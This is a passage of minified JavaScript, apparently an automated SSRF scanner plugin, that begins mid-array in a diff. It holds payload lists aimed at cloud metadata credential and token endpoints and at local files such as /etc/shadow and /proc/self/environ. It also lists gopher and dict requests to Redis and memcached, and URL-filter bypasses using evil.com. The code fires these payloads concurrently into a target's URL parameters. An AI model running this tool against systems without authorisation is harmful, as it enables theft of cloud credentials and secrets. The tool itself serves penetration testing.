+169.254.169.254/latest/meta-data/",description:"AWS metadata endpoint"},{payload:"http://169.254.169.254/latest/meta-data/iam/security-credentials/",description:"\
+AWS IAM credentials"},{payload:"http://169.254.169.254/latest/user-data/",description:"AWS user data"},{payload:"http://169.254.169.254/latest/meta-data/hostnam\
+e",description:"AWS hostname"},{payload:"http://169.254.169.254/latest/meta-data/local-ipv4",description:"AWS local IP"},{payload:"http://169.254.169.254/latest\
+/dynamic/instance-identity/document",description:"AWS instance identity"},{payload:"http://[fd00:ec2::254]/latest/meta-data/",description:"AWS IPv6 metadata"}],
+cloud_gcp:[{payload:"http://metadata.google.internal/computeMetadata/v1/",description:"GCP metadata"},{payload:"http://169.254.169.254/computeMetadata/v1/",description:"\
+GCP metadata alt"},{payload:"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",description:"GCP token"},{payload:"http\
+://metadata.google.internal/computeMetadata/v1/project/project-id",description:"GCP project ID"}],cloud_azure:[{payload:"http://169.254.169.254/metadata/instanc\
+e?api-version=2021-02-01",description:"Azure metadata"},{payload:"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://\
+management.azure.com/",description:"Azure token"}],cloud_digitalocean:[{payload:"http://169.254.169.254/metadata/v1/",description:"DigitalOcean metadata"},{payload:"\
+http://169.254.169.254/metadata/v1/id",description:"DigitalOcean droplet ID"},{payload:"http://169.254.169.254/metadata/v1/hostname",description:"DigitalOcean h\
+ostname"}],protocols:[{payload:"file:///etc/passwd",description:"File protocol - passwd"},{payload:"file:///etc/hosts",description:"File protocol - hosts"},{payload:"\
+file:///etc/shadow",description:"File protocol - shadow"},{payload:"file:///proc/self/environ",description:"File protocol - environ"},{payload:"file:///proc/sel\
+f/cmdline",description:"File protocol - cmdline"},{payload:"file://localhost/etc/passwd",description:"File with localhost"},{payload:"file:///c:/windows/win.ini",
+description:"Windows file"},{payload:"dict://localhost:11211/stat",description:"Dict protocol - memcached"},{payload:"gopher://localhost:6379/_INFO",description:"\
+Gopher protocol - redis"},{payload:"ftp://localhost",description:"FTP protocol"},{payload:"sftp://localhost",description:"SFTP protocol"},{payload:"tftp://local\
+host/file",description:"TFTP protocol"},{payload:"ldap://localhost",description:"LDAP protocol"}],bypass:[{payload:"http://localhost%00.evil.com",description:"N\
+ull byte bypass"},{payload:"http://localhost%2500.evil.com",description:"Double URL encode bypass"},{payload:"http://evil.com@localhost",description:"Basic auth\
+ bypass"},{payload:"http://localhost#@evil.com",description:"Fragment bypass"},{payload:"http://localhost?.evil.com",description:"Query bypass"},{payload:"http:\
+//localhost\\@evil.com",description:"Backslash bypass"},{payload:"http://localhost%23@evil.com",description:"Encoded hash bypass"},{payload:"http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ",
+description:"Unicode bypass"},{payload:"http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ",description:"Unicode domain"},{payload:"http://localhost。evil.com",description:"\
+Fullwidth dot bypass"},{payload:"http://127。0。0。1",description:"Fullwidth dots IP"},{payload:"http://localtest.me",description:"DNS rebinding domain"},{payload:"\
+http://spoofed.burpcollaborator.net",description:"Collaborator domain"}],redirect:[{payload:"http://httpbin.org/redirect-to?url=http://localhost",description:"O\
+pen redirect to localhost"},{payload:"http://httpbin.org/redirect-to?url=http://169.254.169.254/",description:"Open redirect to metadata"}]};var SSRF_INDICATORS=[
+/ami-id/i,/instance-id/i,/security-credentials/i,/iam\/info/i,/computeMetadata/i,/service-accounts/i,/vmId/i,/subscriptionId/i,/root:.*:0:0/,/localhost/i,/\[extensions\]/i,
+/redis_version/i,/memcached/i,/STAT items/i,/Connection refused/i,/Connection timed out/i,/No route to host/i,/Network is unreachable/i];var DEFAULT_CONCURRENCY=32;async function runWithConcurrency(tasks,concurrency){if(tasks.length===0){return[]}const limit=Math.max(1,Math.min(concurrency,tasks.length));const results=new Array(
+tasks.length);let nextIndex=0;const workers=Array.from({length:limit},async()=>{while(true){const index=nextIndex++;if(index>=tasks.length){return}results[index]=
+await tasks[index]()}});await Promise.all(workers);return results}function get_input_schema(){return{type:"object",required:["url"],properties:{url:{type:"strin\
+g",description:"Target URL with potential SSRF parameters"},method:{type:"string",enum:["GET","POST","PUT","PATCH"],description:"HTTP method",default:"GET"},params:{
+type:"object",description:"URL parameters to test (key-value pairs)",additionalProperties:{type:"string"}},headers:{type:"object",description:"Custom headers to\
+ include",additionalProperties:{type:"string"}},body:{type:"string",description:"Request body for POST/PUT requests"},userAgent:{type:"string",description:"Cust\
+om User-Agent header"},callbackUrl:{type:"string",description:"Callback URL for out-of-band detection (e.g., Burp Collaborator)"},testInternal:{type:"boolean",description:"\
+Test internal network payloads",default:true},testCloud:{type:"boolean",description:"Test cloud metadata payloads",default:true},testProtocols:{type:"boolean",description:"\
+Test alternative protocols (file://, gopher://, etc.)",default:true}}}}pluginGlobals.get_input_schema=get_input_schema;function getBusinessOutputSchema(){return{
+type:"object",properties:{success:{type:"boolean",description:"Whether the operation succeeded"},data:{type:"object",properties:{url:{type:"string",description:"\
+Target URL"},method:{type:"string"},tests:{type:"array",items:{type:"object",properties:{parameter:{type:"string"},payload:{type:"string"},payloadType:{type:"st\
+ring"},vulnerable:{type:"boolean"},evidence:{type:"string"}}},description:"SSRF test results"},summary:{type:"object",properties:{totalTests:{type:"integer"},vulnerableCount:{
+type:"integer"},vulnerableParameters:{type:"array",items:{type:"string"}}}}}},error:{type:"string",description:"Error message if failed"}}}}pluginGlobals.get_output_schema=
+get_output_schema;function parseUrl(url){try{const urlObj=new URL(url);const params={};urlObj.searchParams.forEach((value,key)=>{params[key]=value});return{baseUrl:`${urlObj.
+origin}${urlObj.pathname}`,params}}catch{return{baseUrl:url,params:{}}}}function buildUrl(baseUrl,params){const url=new URL(baseUrl);for(const[key,value]of Object.
+entries(params)){url.searchParams.set(key,value)}return url.toString()}function checkSsrfIndicators(responseText){for(const indicator of SSRF_INDICATORS){if(indicator.
+test(responseText)){const match=responseText.match(indicator);return match?match[0]:"Pattern matched"}}return null}function identifyUrlParams(params){const urlParams=[];
+const urlParamNames=["url","uri","link","href","src","source","dest","destination","redirect","redirect_uri","redirect_url","return","return_url","next","next_u\
+rl","target","path","file","page","load","fetch","request","proxy","forward","callback","continue","image","img","picture","photo","avatar","icon","logo","feed",
+"rss","xml","data","content","resource","ref","site","host","domain","endpoint","api","service"];for(const[key,value]of Object.entries(params)){const lowerKey=key.
+toLowerCase();if(urlParamNames.some(name=>lowerKey.includes(name))){urlParams.push(key);continue}if(value.startsWith("http://")||value.startsWith("https://")||value.
+startsWith("//")){urlParams.push(key)}}return[...new Set(urlParams)]}function dedupeTypedPayloads(payloads){const seen=new Set;const deduped=[];for(const payloadEntry of payloads){
+const payload=String(payloadEntry.payload||"").trim();if(!payload||seen.has(payload))continue;seen.add(payload);deduped.push({payload,type:payloadEntry.type})}return deduped}
+function hasStrongSsrfEvidence(test){if(!test.vulnerable||typeof test.evidence!=="string")return false;return!test.evidence.toLowerCase().startsWith("slow respo\
+nse")}async function testPayload(baseUrl,params,targetParam,payload,payloadType,options){const testParams={...params,[targetParam]:payload};const testUrl=buildUrl(
+baseUrl,testParams);const startTime=performance.now();try{const response=await observedFetch(testUrl,{method:options.method,headers:options.headers,redirect:"fo\
+llow",timeout:1e4});const responseTime=Math.round(performance.now()-startTime);const responseText=await response.text();const evidence=checkSsrfIndicators(responseText);
+const timingAnomaly=responseTime>5e3;const vulnerable=evidence!==null||timingAnomaly;return{parameter:targetParam,payload,payloadType,vulnerable,evidence:evidence||
+(timingAnomaly?"Slow response (possible internal network access)":void 0),responseCode:response.status,responseTime}}catch(error){const responseTime=Math.round(
+performance.now()-startTime);const errorMessage=error.message||String(error);const errorIndicatesAccess=/refused|timeout|unreachable/i.test(errorMessage);return{
+parameter:targetParam,payload,payloadType,vulnerable:errorIndicatesAccess,evidence:errorIndicatesAccess?`Error indicates internal access: ${errorMessage}`:void 0,
+responseTime,error:errorMessage}}}async function analyzeBusiness(input){try{if(!input.url||typeof input.url!=="string"){return{success:false,error:"Invalid inpu\
+t: url parameter is required"}}const{baseUrl,params:urlParams}=parseUrl(input.url);const params={...urlParams,...input.params||{}};const method=input.method||"G\
+ET";const userAgent=input.userAgent||"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";const testInternal=input.testInternal!==false;const testCloud=input.
+testCloud!==false;const testProtocols=input.testProtocols!==false;const headers={"User-Agent":userAgent,Accept:"*/*",...input.headers||{}};const urlParamsToTest=identifyUrlParams(
+params);if(urlParamsToTest.length===0){return{success:true,data:{url:input.url,method,tests:[],summary:{totalTests:0,vulnerableCount:0,testedParameters:[],vulnerableParameters:[]}}}}
+const payloadsToTest=[];for(const p of SSRF_PAYLOADS.localhost){payloadsToTest.push({payload:p.payload,type:"localhost"})}if(testInternal){for(const p of SSRF_PAYLOADS.
+internal){payloadsToTest.push({payload:p.payload,type:"internal"})}}if(testCloud){for(const p of SSRF_PAYLOADS.cloud_aws){payloadsToTest.push({payload:p.payload,
+type:"cloud_aws"})}for(const p of SSRF_PAYLOADS.cloud_gcp){payloadsToTest.push({payload:p.payload,type:"cloud_gcp"})}for(const p of SSRF_PAYLOADS.cloud_azure){payloadsToTest.
+push({payload:p.payload,type:"cloud_azure"})}}if(testProtocols){for(const p of SSRF_PAYLOADS.protocols){payloadsToTest.push({payload:p.payload,type:"protocols"})}}
+for(const p of SSRF_PAYLOADS.bypass.slice(0,5)){payloadsToTest.push({payload:p.payload,type:"bypass"})}if(input.callbackUrl){payloadsToTest.push({payload:input.
+callbackUrl,type:"callback"})}const dedupedPayloads=dedupeTypedPayloads(payloadsToTest);const compromisedParams=new Set;const payloadTasks=[];for(const param of urlParamsToTest){
+for(const{payload,type}of dedupedPayloads){payloadTasks.push(async()=>{if(compromisedParams.has(param))return null;const result=await testPayload(baseUrl,params,
+param,payload,type,{method,headers});if(hasStrongSsrfEvidence(result)){compromisedParams.add(param)}return result})}}const tests=(await runWithConcurrency(payloadTasks,
+DEFAULT_CONCURRENCY)).filter(test=>Boolean(test));const vulnerableTests=tests.filter(t=>t.vulnerable);const vulnerableParameters=[...new Set(vulnerableTests.map(
+t=>t.parameter))];return{success:true,data:{url:input.url,method,tests,summary:{totalTests:tests.length,vulnerableCount:vulnerableTests.length,testedParameters:urlParamsToTest,
+vulnerableParameters}}}}catch(error){return{success:false,error:error instanceof Error?error.message:String(error)}}}pluginGlobals.analyze=analyze;function get_output_schema(){
+return monitorToolOutputSchema(getBusinessOutputSchema())}async function analyze(input){return await runMonitorTool(input,get_input_schema(),analyzeBusiness)}export{analyze,get_input_schema,get_output_schema};
+globalThis.get_input_schema=get_input_schema; globalThis.get_output_schema=get_output_schema; globalThis.analyze=analyze;
